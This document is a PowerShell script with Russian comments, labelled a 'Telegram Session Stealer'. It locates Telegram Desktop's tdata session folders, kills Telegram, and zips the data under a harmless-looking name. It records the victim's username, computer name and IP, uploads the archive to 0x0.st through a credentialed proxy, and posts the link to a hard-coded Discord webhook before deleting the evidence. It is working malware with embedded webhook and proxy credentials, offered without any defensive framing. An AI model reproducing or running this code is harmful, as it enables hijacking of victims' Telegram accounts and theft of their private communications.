# ============================================================
# Telegram Session Stealer → 0x0.st → Discord Webhook (с прокси)
# ============================================================

$webhook = "https://discord.com/api/webhooks/1529082055714144276/gLKHwTckMgB8SlrhIh_jYEour-5zoFrKK7R4d18sQ5qroCYB8gQejCbKYwttIM8-TXE8"

# Прокси (логин:пароль@хост:порт)
$proxyUrl = "http://user-xpx93ax5:5pxp942ldb7jtnh2@gate.proxydata.ru:3129"
$proxy = New-Object System.Net.WebProxy($proxyUrl)
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

# 1. Поиск tdata
$paths = @()
@("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
    if (Test-Path $_) { $paths += $_ }
}
if ($paths.Count -eq 0) {
    # Отправка в Discord через прокси
    $wc = New-Object System.Net.WebClient
    $wc.Proxy = $proxy
    $body = @{ content = "❌ tdata not found" } | ConvertTo-Json
    $wc.UploadString($webhook, "POST", $body) | Out-Null
    exit
}

# 2. Завершаем Telegram
Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force

# 3. Архивация
$zip = "$env:TEMP\diag.zip"
Compress-Archive -Path $paths -DestinationPath $zip -Force

# 4. Сбор информации
$user = $env:USERNAME
$comp = $env:COMPUTERNAME
$ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content.Trim()

# 5. Загрузка на 0x0.st (через прокси)
$uploadUrl = "https://0x0.st"
$wcUpload = New-Object System.Net.WebClient
$wcUpload.Proxy = $proxy
$response = $wcUpload.UploadFile($uploadUrl, "POST", $zip)
$link = [System.Text.Encoding]::UTF8.GetString($response).Trim()

# 6. Отправка ссылки в Discord (через прокси)
$message = "$user@$comp | IP: $ip | Download: $link"
$wc = New-Object System.Net.WebClient
$wc.Proxy = $proxy
$body = @{ content = $message } | ConvertTo-Json
$wc.UploadString($webhook, "POST", $body) | Out-Null

# 7. Удаляем архив
Remove-Item $zip -Force -ErrorAction SilentlyContinue
